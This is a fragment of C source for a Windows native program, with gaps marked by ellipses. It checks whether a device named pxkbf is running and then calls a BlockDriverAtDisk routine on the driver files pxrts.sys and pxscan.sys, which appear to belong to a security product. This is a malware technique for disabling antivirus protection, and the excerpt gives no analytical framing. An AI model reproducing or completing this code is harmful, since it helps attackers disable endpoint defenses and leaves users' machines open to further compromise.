...
#define DRVROOT L"\\SystemRoot\\system32\\drivers\\"
#define PXRTS L"pxrts.sys"
#define PXSCAN L"pxscan.sys"
...
void BlockDriverAtDisk(PWSTR lpFileName)
{
	HANDLE hFile;
	OBJECT_ATTRIBUTES attr;
	IO_STATUS_BLOCK iost;
	...
	RtlInitUnicodeString(&TargetFileName, lpFileName);
	InitializeObjectAttributes(&attr, &TargetFileName, OBJ_CASE_INSENSITIVE, 0, 0);
...
void NtProcessStartup( PSTARTUP_ARGUMENT Argument )
{
    ...
    if (DeviceIsRunning(L"\\??\\pxkbf")) 
	{
        strcpyW(buf, DRVROOT);
        strcatW(buf, PXRTS);
        BlockDriverAtDisk(buf);
